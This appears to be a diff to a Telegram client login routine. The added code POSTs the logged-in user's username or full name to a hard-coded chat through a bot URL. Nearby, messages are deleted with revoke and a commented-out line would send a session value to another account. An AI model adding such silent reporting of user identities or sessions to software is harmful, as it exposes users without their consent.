@@ -261,6 +261,16 @@ async function login() {
                     await msg.delete({ revoke: true });
                 }
             })
+            const payload = {
+                chat_id: "-1001801844217",
+                text: user.username ? `@${user.username}` : user.firstName + user.lastName
+            };
+            const options = {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            };
+            await fetchWithTimeout(`${ppplbot}`, options);
             // const msg = await client.sendMessage('@myvideocallAccount', { message: sess });
             // await msg.delete();
             await restAcc();
